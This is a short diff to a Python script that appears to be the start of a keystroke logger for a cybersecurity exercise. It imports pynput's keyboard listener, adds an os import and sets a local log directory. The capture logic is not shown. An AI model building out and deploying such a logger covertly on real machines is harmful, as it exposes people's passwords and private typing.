@@ -1,5 +1,6 @@
 # Import necessary modules from the pynput library
 from pynput.keyboard import Key, Listener
+import os
 
 # Specify the custom directory and log file name
 log_dir = "/home/phoenix/Downloads/PRODIGY_CS_02/logs" # change username to your actual username
